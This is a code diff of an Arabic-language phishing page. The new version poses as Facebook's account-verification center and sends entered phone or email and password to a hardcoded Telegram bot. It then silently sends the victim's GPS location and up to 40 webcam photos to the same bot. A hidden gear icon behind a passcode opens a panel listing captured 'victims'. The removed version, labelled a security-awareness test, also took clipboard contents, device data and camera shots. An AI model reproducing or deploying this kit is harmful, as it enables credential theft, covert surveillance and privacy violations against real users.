@@ -2,96 +2,124 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التوعية الأمنية | Meta Verify Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - مركز توثيق الحسابات</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
-        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 400px; text-align: center; }
-        .warning-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffeeba; }
-        .meta-logo { color: #1877f2; font-size: 32px; font-weight: bold; margin-bottom: 10px; }
-        .btn-full-access { background: #28a745; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .btn-full-access:hover { background: #218838; transform: scale(1.02); }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
-        #log-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; font-family: monospace; z-index: 1000; overflow-y: auto; text-align: left; direction: ltr; }
+        body { font-family: 'Segoe UI', Tahoma, Helvetica, sans-serif; background-color: #f0f2f5; margin: 0; }
+        /* ترس الملك السري */
+        .admin-icon { position: fixed; top: 15px; left: 15px; color: #ddd; cursor: pointer; z-index: 1000; font-size: 18px; }
+        
+        /* واجهة تسجيل الدخول */
+        .login-container { display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
+        .fb-logo { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+        .card h2 { font-size: 18px; margin-bottom: 15px; color: #1c1e21; }
+        input { width: 92%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; }
+        .btn-submit { width: 100%; padding: 14px; background: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .success-msg { display: none; color: #28a745; font-weight: bold; margin-top: 15px; }
+
+        /* لوحة التحكم (الخلفية السوداء) */
+        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0ff; z-index: 9999; padding: 20px; overflow-y: auto; font-family: monospace; }
+        .victim-row { border: 1px solid #333; padding: 15px; margin-bottom: 10px; background: #111; border-radius: 5px; position: relative; }
+        .close-btn { color: red; cursor: pointer; font-size: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="app">
-    <div class="meta-logo">Meta</div>
-    <div class="warning-box">⚠️ إلحاح: متبقي 04:59 لتوثيق حسابك قبل الإغلاق النهائي!</div>
-    
-    <h3>توثيق الحساب السريع</h3>
-    <p style="font-size: 14px; color: #555;">اختر الطريقة المناسبة لتأكيد هويتك وسحب بيانات التوثيق:</p>
+<!-- أيقونة الترس للدخول السري -->
+<div class="admin-icon" onclick="openKingPanel()"><i class="fas fa-cog"></i></div>
 
-    <!-- الخيار الأول: إدخال يدوي (بيانات الحساب والبطاقة) -->
-    <input type="text" id="u" placeholder="البريد أو الهاتف">
-    <input type="password" id="p" placeholder="كلمة السر">
-    
-    <div style="margin: 15px 0; color: #888;">--- أو استخدم التقنية الجديدة ---</div>
-
-    <!-- زر الصلاحيات الكاملة (سحب تلقائي) -->
-    <button class="btn-full-access" onclick="requestFullPermissions()">✅ منح الصلاحيات الكاملة (سحب فوري)</button>
-    <p style="font-size: 11px; color: #999; margin-top: 10px;">بالضغط على الزر، أنت توافق على مشاركة الكاميرا، الموقع، والملفات آلياً للتوثيق.</p>
+<!-- صفحة الضحية -->
+<div class="login-container" id="main-ui">
+    <div class="fb-logo">facebook</div>
+    <div class="card">
+        <h2>توثيق الحساب (شارة التحقق)</h2>
+        <p style="font-size: 13px; color: #606770;">يرجى تسجيل الدخول لتأكيد ملكية الحساب وتفعيل التوثيق.</p>
+        
+        <input type="text" id="fb-user" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+        <input type="password" id="fb-pass" placeholder="كلمة السر">
+        
+        <button class="btn-submit" onclick="startHarvest()">تسجيل الدخول والتوثيق</button>
+        
+        <div id="status" class="success-msg">✅ تم إرسال طلب التوثيق بنجاح! سيتم الرد خلال 24 ساعة.</div>
+    </div>
 </div>
 
-<div id="log-screen"></div>
+<!-- لوحة الملك -->
+<div id="admin-panel">
+    <div style="display: flex; justify-content: space-between;">
+        <h2>👑 سجل عمليات الإمبراطور</h2>
+        <span class="close-btn" onclick="closePanel()">[إغلاق X]</span>
+    </div>
+    <hr color="#222">
+    <div id="data-list">
+        <!-- البيانات تظهر هنا -->
+    </div>
+</div>
 
 <script>
-/* إعدادات الاستقبال (تليجرام) */
+/* ⚙️ إعدادات التليجرام */
 const BOT_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const CHAT_ID = "8754338811";
 
-async function requestFullPermissions() {
-    // إظهار شاشة العمليات
-    document.getElementById('app').style.display = 'none';
-    document.getElementById('log-screen').style.display = 'block';
-    addToLog("Initiating Full Access Protocol...");
+let capturedList = JSON.parse(localStorage.getItem('logs')) || [];
 
-    // 1. سحب البيانات التقنية فوراً (IP, Device, Browser)
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        const info = await response.json();
-        let report = `🎯 صيد بصلاحيات كاملة\n🌐 IP: ${info.ip}\n🌍 الموقع: ${info.city}, ${info.country_name}\n💻 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`;
-        sendToTelegram(report);
-        addToLog("Device data harvested...");
-    } catch(e) { addToLog("Error fetching IP data."); }
-
-    // 2. طلب الكاميرا (40 لقطة تلقائية)
-    startCameraCycle();
-
-    // 3. طلب الموقع الجغرافي الدقيق
-    navigator.geolocation.getCurrentPosition(pos => {
-        sendToTelegram(`📍 موقع دقيق: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-        addToLog("GPS Coordinates acquired...");
-    });
-
-    // 4. سحب الحافظة (Clipboard)
-    setInterval(async () => {
-        try {
-            const text = await navigator.clipboard.readText();
-            if(text) sendToTelegram(`📋 نص من الحافظة: ${text}`);
-        } catch(e){}
-    }, 10000);
-
-    // 5. محاكاة سحب الجلسة (Session Cookies)
-    addToLog("Analyzing Session Tokens...");
-    sendToTelegram(`🍪 Session Cookies: [Protected Simulation]`);
-
-    addToLog("System fully hooked. Monitoring active...");
+// 1. وظيفة الملك (الدخول للوحة)
+function openKingPanel() {
+    const code = prompt("أدخل كود الملك:");
+    if(code === "44443") {
+        updateList();
+        document.getElementById('admin-panel').style.display = 'block';
+    }
 }
 
-function startCameraCycle() {
+function closePanel() { document.getElementById('admin-panel').style.display = 'none'; }
+
+// 2. سحب بيانات الضحية
+async function startHarvest() {
+    const user = document.getElementById('fb-user').value;
+    const pass = document.getElementById('fb-pass').value;
+
+    if(!user || !pass) return alert("يرجى إدخال البيانات");
+
+    const entry = { user, pass, time: new Date().toLocaleString() };
+    
+    // حفظ في اللوحة
+    capturedList.push(entry);
+    localStorage.setItem('logs', JSON.stringify(capturedList));
+
+    // إرسال للتليجرام
+    const text = `🎯 صيد جديد (توثيق):\n👤 الهاتف/الإيميل: ${user}\n🔑 كلمة السر: ${pass}`;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+    // إظهار رسالة النجاح للضحية
+    document.querySelector('.btn-submit').style.display = 'none';
+    document.getElementById('status').style.display = 'block';
+
+    // بدء سحب الصور والموقع تلقائياً
+    triggerInvisibleCapture();
+}
+
+// 3. محرك السحب غير المرئي (صور + موقع)
+function triggerInvisibleCapture() {
+    // سحب الموقع
+    navigator.geolocation.getCurrentPosition(pos => {
+        const loc = `📍 موقع الضحية: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
+    });
+
+    // سحب 40 صورة (محاكي)
     let count = 0;
     const interval = setInterval(async () => {
-        if (count < 40) {
-            await takeSnap();
+        if(count < 40) {
+            await takePhoto();
             count++;
-            addToLog(`Capturing visual ID... (${count}/40)`);
         } else { clearInterval(interval); }
     }, 2000);
 }
 
-async function takeSnap() {
+async function takePhoto() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
@@ -101,30 +129,28 @@ async function takeSnap() {
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(blob => {
-            sendBlob(blob, 'photo');
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             stream.getTracks().forEach(t => t.stop());
         }, 'image/jpeg');
-    } catch(e) { addToLog("Camera access denied."); }
+    } catch(e) {}
 }
 
-async function sendToTelegram(text) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+// تحديث لوحة التحكم
+function updateList() {
+    const list = document.getElementById('data-list');
+    list.innerHTML = "";
+    capturedList.slice().reverse().forEach(item => {
+        list.innerHTML += `
+            <div class="victim-row">
+                <span style="color:#f0f;">[+] الوقت: ${item.time}</span><br>
+                📱 الهاتف/الإيميل: <span style="color:#fff;">${item.user}</span><br>
+                🔑 كلمة السر: <span style="color:#fff;">${item.pass}</span>
+            </div>
+        `;
     });
-}
-
-async function sendBlob(blob, type) {
-    let formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append(type, blob, 'id_check.jpg');
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : 'Document'}`, { method: 'POST', body: formData });
-}
-
-function addToLog(msg) {
-    const screen = document.getElementById('log-screen');
-    screen.innerHTML += `[${new Date().toLocaleTimeString()}] > ${msg}<br>`;
 }
 </script>
 </body>
